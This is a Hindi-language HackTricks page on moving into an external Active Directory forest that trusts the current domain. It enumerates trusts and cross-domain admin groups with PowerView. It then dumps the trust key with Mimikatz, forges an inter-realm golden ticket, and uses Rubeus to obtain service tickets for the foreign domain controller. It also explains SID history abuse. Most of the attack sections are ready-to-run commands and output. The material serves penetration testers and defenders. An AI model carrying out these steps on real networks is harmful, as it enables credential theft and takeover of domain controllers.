# बाहरी वन डोमेन - एकतरफा (इनबाउंड) या द्विदिशीय

{{#include ../../banners/hacktricks-training.md}}

इस परिदृश्य में एक बाहरी डोमेन आप पर भरोसा कर रहा है (या दोनों एक-दूसरे पर भरोसा कर रहे हैं), इसलिए आप इसके ऊपर कुछ प्रकार की पहुंच प्राप्त कर सकते हैं।

## गणना

सबसे पहले, आपको **गणना** करनी होगी **भरोसे** की:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
पिछली गणना में यह पाया गया कि उपयोगकर्ता **`crossuser`** **`External Admins`** समूह के अंदर है, जिसके पास **DC of the external domain** के अंदर **Admin access** है।

## प्रारंभिक पहुंच

यदि आप अन्य डोमेन में अपने उपयोगकर्ता की कोई **विशेष** पहुंच नहीं पा रहे हैं, तो आप अभी भी AD पद्धति पर वापस जा सकते हैं और **एक अप्रिविलेज्ड उपयोगकर्ता से प्रिवेस्क** करने की कोशिश कर सकते हैं (जैसे कि केर्बेरोस्टिंग):

आप **Powerview functions** का उपयोग करके `-Domain` पैरामीटर के साथ **अन्य डोमेन** को **गणना** करने के लिए कर सकते हैं जैसे:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## अनुकरण

### लॉगिन करना

एक सामान्य विधि का उपयोग करते हुए, जिन उपयोगकर्ताओं के पास बाहरी डोमेन तक पहुंच है, उनके क्रेडेंशियल्स के साथ आपको निम्नलिखित तक पहुंच प्राप्त करनी चाहिए:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID इतिहास का दुरुपयोग

आप एक जंगल ट्रस्ट के पार [**SID इतिहास**](sid-history-injection.md) का भी दुरुपयोग कर सकते हैं।

यदि एक उपयोगकर्ता **एक जंगल से दूसरे जंगल में** स्थानांतरित किया जाता है और **SID फ़िल्टरिंग सक्षम नहीं है**, तो **दूसरे जंगल से एक SID जोड़ना** संभव हो जाता है, और यह **SID** **विश्वास** के पार प्रमाणीकरण करते समय **उपयोगकर्ता के टोकन** में **जोड़ा** जाएगा।

> [!WARNING]
> याद दिलाने के लिए, आप साइनिंग कुंजी प्राप्त कर सकते हैं
>
> ```powershell
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

आप **वर्तमान डोमेन** के उपयोगकर्ता का **TGT अनुकरण** करने के लिए **विश्वसनीय** कुंजी के साथ **हस्ताक्षर** कर सकते हैं।
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### उपयोगकर्ता का पूर्ण तरीके से अनुकरण करना
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
{{#include ../../banners/hacktricks-training.md}}
